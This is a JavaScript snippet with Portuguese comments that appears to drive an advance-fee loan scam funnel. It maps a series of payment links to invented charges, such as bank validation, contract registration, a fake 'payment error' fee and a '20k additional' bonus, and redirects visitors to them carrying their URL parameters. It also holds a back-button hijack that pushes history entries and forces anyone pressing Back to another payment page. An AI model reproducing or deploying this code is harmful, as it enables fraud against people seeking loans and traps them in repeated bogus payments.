   const baseLinks = {
  up2: "https://pay.agilbank.fun/JqoR32b6V2y3Vj5", // Validação Bancaria
  up3: "https://pay.agilbank.fun/nWrxGWA9X0o3654", // Seguro Prestamista "tarifa de cadastro"
  up4: "https://pay.agilbank.fun/lDW0ZaJWLE6GN7E", // NFe
  up5: "https://pay.agilbank.fun/KV603ko1YkL3w8y", // Ativar conta
  up6: "https://pay.agilbank.fun/QqyLgqob5XJZvkE", // Taxa de registro do contrato
  up7: "https://pay.agilbank.fun/a6pVgd2qoXoZk7B", // ParabÃ©ns, 20k adicional
  up8: "https://pay.agilbank.fun/PVYB34e6JDLZKzk", // Erro no pagamento - 14,06
  up9: "https://pay.agilbank.fun/YL9jZDWqajn3p4q", // APP - 11,99
  up10: "https://pay.agilbank.fun/nOzxZooNnX1ZJ07", // Taxa de Abertura TAC - 16,92
  up11: "https://pay.agilbank.fun/v7R0gloO7X5GVr9", // Taxa de Consultoria Financeira - 19,53
  };
function redirect(key) {
  try {
    if (!baseLinks[key]) {
      throw new Error(`Link para ${key} não encontrado!`);
    }

    const url = new URL(baseLinks[key]);
    url.search = new URLSearchParams(window.location.search).toString();

    window.location.href = url.href;
  } catch (error) {
    console.error("Erro no redirecionamento:", error);
    alert(`Erro: ${error.message || "Não foi possível redirecionar"}`);
  }
}


const backRedirectBackLink =
  "https://pay.app-agil.online/v7R0gloJxP6GVr9";

// Adiciona duas entradas no histÃ³rico para capturar a navegaÃ§Ã£o para trÃ¡s
history.pushState({}, "", location.href);
history.pushState({}, "", location.href);

// Captura o evento de navegaÃ§Ã£o para trÃ¡s e redireciona
window.onpopstate = function () {
  setTimeout(() => {
    location.href = backRedirectBackLink;
  }, 1);
};